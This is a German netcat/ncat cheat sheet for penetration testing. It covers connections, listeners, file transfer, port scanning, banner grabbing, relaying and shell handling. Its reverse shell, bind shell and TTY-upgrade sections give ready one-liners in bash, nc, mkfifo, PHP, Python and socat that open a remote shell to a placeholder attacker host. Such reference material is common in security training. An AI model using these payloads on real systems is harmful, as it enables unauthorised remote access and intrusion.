Grundlagen & Verbindung
TCP-Verbindung aufbauen
nc HOST PORT
UDP-Verbindung
nc -u HOST PORT
Verbose / extra verbose
nc -v HOST PORT # Verbindungsinfo nc -vv HOST PORT # extra verbose
Timeout / kein DNS-Lookup
nc -w 5 HOST PORT # Timeout 5 s nc -n HOST PORT # kein DNS
Port-Scan ohne Datenübertragung
nc -z HOST 1-1024
TLS-Verbindung (ncat)
ncat --ssl HOST PORT
nc (GNU/BSD) vs. ncat (Nmap-Projekt): ncat bietet SSL, Broker-Modus und mehr Optionen. -n verhindert DNS-Lookups für schnellere Verbindungen.
👂
Listen-Mode (Server)
Einmalig auf Port lauschen
nc -l PORT
Dauerhaft lauschen (keep-open)
nc -lk PORT
Verbose / UDP-Listener
nc -lv PORT # verbose nc -lu PORT # UDP
Typischer Shell-Listener
nc -lvp 4444
ncat — keep-open / verschlüsselt
ncat -l PORT --keep-open ncat -l PORT --ssl
-lk (GNU nc) akzeptiert mehrere Verbindungen nacheinander. Bei BSD nc -l und Schleife im Shell-Skript verwenden.
📦
Dateitransfer
Empfänger vorbereiten
nc -l 9999 > empfangen.bin
Sender (Datei übertragen)
nc HOST 9999 < datei.bin
Mit Fortschrittsanzeige (pv)
nc -l 9999 | pv > datei.bin
Verzeichnis senden / empfangen
# Sender: tar czf - /verz | nc HOST 9999 # Empfänger: nc -l 9999 | tar xzf -
Einfacher HTTP-Einmal-Webserver
while true; do nc -l 8080 < index.html; done
Kein Verschlüsselung — bei sensiblen Daten ncat --ssl oder scp/rsync über SSH bevorzugen.
🐚
Reverse Shells
Listener auf Angreifer-Seite
nc -lvp 4444
Bash Reverse Shell (Opfer)
bash -i >& /dev/tcp/ANGREIFER/4444 0>&1
nc mit -e (GNU/ncat)
nc ANGREIFER 4444 -e /bin/sh
Ohne -e (BSD nc / mkfifo)
rm /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 \ | nc ANGREIFER 4444 > /tmp/f
PHP Reverse Shell
php -r '$s=fsockopen("ANGREIFER",4444); exec("/bin/sh -i <&3 >&3 2>&3");'
Python3 Reverse Shell
python3 -c 'import socket,subprocess,os s=socket.socket() s.connect(("ANGREIFER",4444)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) subprocess.call(["/bin/sh","-i"])'
-e fehlt bei OpenBSD nc. Dort mkfifo-Trick verwenden oder ncat installieren (Nmap-Paket).
🔗
Bind Shells
Opfer bindet Shell an Port (mit -e)
nc -lvp 4444 -e /bin/bash
Angreifer verbindet sich
nc OPFER 4444
Bind Shell ohne -e (mkfifo)
rm /tmp/f; mkfifo /tmp/f cat /tmp/f | bash -i 2>&1 \ | nc -l 4444 > /tmp/f
Windows Bind Shell (cmd.exe)
nc -lvp 4444 -e cmd.exe
Bind Shell = Opfer lauscht. Reverse Shell = Opfer verbindet sich zurück. Reverse Shells umgehen Firewalls leichter, da ausgehende Verbindungen oft erlaubt sind.
🔍
Port-Scanning
Port-Scan mit Ausgabe
nc -zv HOST 1-1024
Spezifische Ports prüfen
nc -zv HOST 22 80 443 3306
Nur offene Ports ausgeben
nc -zvn HOST 1-65535 2>&1 \ | grep succeeded
UDP-Scan / mit Timeout
nc -zvu HOST 1-1024 nc -zvw1 HOST 1-1024 2>&1
Shell-Schleife über Portbereich
for p in $(seq 1 1024); do nc -zw1 HOST $p \ && echo "OPEN: $p" done
Hinweis: Für umfangreiche Scans ist nmap besser geeignet. nc-Scans sind langsam und erzeugen mehr Logs.
🏷️
Banner Grabbing
HTTP-Banner / HEAD-Request
echo "" | nc -w1 HOST 80 echo -e "HEAD / HTTP/1.0\r\n" | nc HOST 80
SMTP-Banner
nc HOST 25
FTP-Banner
nc HOST 21
SSH-Banner
nc HOST 22
POP3-Banner
echo "QUIT" | nc HOST 110
Banner Grabbing liefert Versionsinformationen ohne aktiven Scan. Kombiniere mit -w1 (Timeout), damit nc nicht hängt.
🔄
Proxying & Relaying
Bidirektionaler Port-Forward (mkfifo)
mkfifo /tmp/pipe nc -l 8080 < /tmp/pipe \ | nc ZIEL 80 > /tmp/pipe
ncat SOCKS5-Proxy-Verbindung
ncat --proxy-type socks5 \ --proxy proxyhost:1080 \ ZIEL PORT
ncat Broker (Multi-Client-Relay)
ncat -l PORT --broker # alle verbundenen Clients erhalten # gegenseitig ihre Nachrichten
SSH-Tunnel bevorzugen wenn möglich: ssh -L 8080:ziel:80 user@sprunghost — verschlüsselt und zuverlässiger.
⚡
ncat-Erweiterungen
Einfacher Chat-Server
ncat -l PORT --chat
Shell binden (exec)
ncat -l PORT --exec /bin/bash ncat -l PORT --sh-exec "bash"
TLS-Listener mit eigenem Zertifikat
ncat --ssl -l PORT ncat --ssl-cert cert.pem \ --ssl-key key.pem -l PORT
Verbindungslimit setzen
ncat -l PORT --max-conns 1
ncat ist im nmap-Paket enthalten (apt install nmap / dnf install nmap). Es ist der moderne Ersatz für nc mit SSL-Unterstützung.
🖥️
Shell Upgrade & TTY
Schritt 1 — PTY spawnen (Python)
python3 -c 'import pty; pty.spawn("/bin/bash")'
Schritt 2 — TTY auf Angreifer-Seite
# Ctrl+Z → nc in Hintergrund stty raw -echo; fg # Enter drücken → Shell zurück
Schritt 3 — Terminal-Umgebung setzen
export TERM=xterm-256color stty rows 40 cols 150
Direkt vollständiges TTY (socat)
# Angreifer: socat file:`tty`,raw,echo=0 tcp:HOST:PORT # Opfer: socat tcp-connect:HOST:PORT \ exec:bash,pty,stderr,sane
History & Editierung (rlwrap)
rlwrap nc -lvp 4444
Vollständiges TTY erlaubt Tab-Completion, Cursor-Tasten, sudo und interaktive Programme wie vi. Ohne TTY-Upgrade funktionieren viele Befehle nicht korrekt.
